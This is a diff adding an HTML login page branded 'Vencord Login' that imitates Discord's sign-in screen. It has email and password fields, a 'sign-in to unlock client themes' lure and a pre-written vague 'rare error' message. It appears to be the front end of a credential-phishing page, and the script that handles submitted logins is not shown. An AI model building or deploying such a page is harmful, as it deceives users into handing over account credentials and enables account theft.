@@ -1,0 +1,83 @@
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Vencord Login</title>
+  <link rel="stylesheet" href="styles.css">
+  <link href="https://fonts.googleapis.com/css2?family=gg+sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+  <div class="themes-button">
+    <button onclick="toggleThemes()">Themes</button>
+    <div class="themes-locked">Sign-in to unlock client themes</div>
+  </div>
+  
+  <div class="themes-panel" style="display: none;">
+    <div class="themes-content">
+      <h3>Theme Customization</h3>
+      <div class="theme-option">
+        <label>Background Color:</label>
+        <input type="color" id="bgColor" value="#1e1f22">
+      </div>
+      <div class="theme-option">
+        <label>Font Family:</label>
+        <select id="fontSelect">
+          <option value="gg sans">GG Sans</option>
+          <option value="Arial">Arial</option>
+          <option value="Helvetica">Helvetica</option>
+          <option value="Times New Roman">Times New Roman</option>
+        </select>
+      </div>
+      <div class="theme-option">
+        <label>Custom Background:</label>
+        <input type="file" id="bgImage" accept="image/*">
+      </div>
+      <button class="restore-defaults" onclick="restoreDefaults()">Restore Defaults</button>
+    </div>
+  </div>
+
+  <div class="login-container">
+    <div class="login-box">
+      <div class="login-form">
+        <h3 class="title">Welcome back!</h3>
+        <div class="subtitle">We're so excited to see you again!</div>
+        
+        <form id="loginForm">
+          <div class="form-group">
+            <label for="email">EMAIL OR PHONE NUMBER <span class="required">*</span></label>
+            <input type="text" id="email" required>
+          </div>
+
+          <div class="form-group">
+            <label for="password">PASSWORD <span class="required">*</span></label>
+            <input type="password" id="password" required>
+          </div>
+
+          <a href="#" class="forgot-password">Forgot your password?</a>
+
+          <button type="submit" class="login-button">Log In</button>
+          
+          <div id="error-message" class="error-message" style="display: none;">
+            Caught a rare error: sign-in process ended for an unidentified error
+          </div>
+
+          <div class="register">
+            Need an account? <a href="#">Register</a>
+          </div>
+        </form>
+      </div>
+      
+      <div class="qr-login">
+        <div class="qr-container">
+          <img src="unnamed.png" alt="Vencord Logo" class="qr-code">
+        </div>
+        <div class="qr-text">
+          <p>Vencord Experimental Private</p>
+        </div>
+      </div>
+    </div>
+  </div>
+  <script src="login.js"></script>
+  <script src="themes.js"></script>
+</body>
+</html>
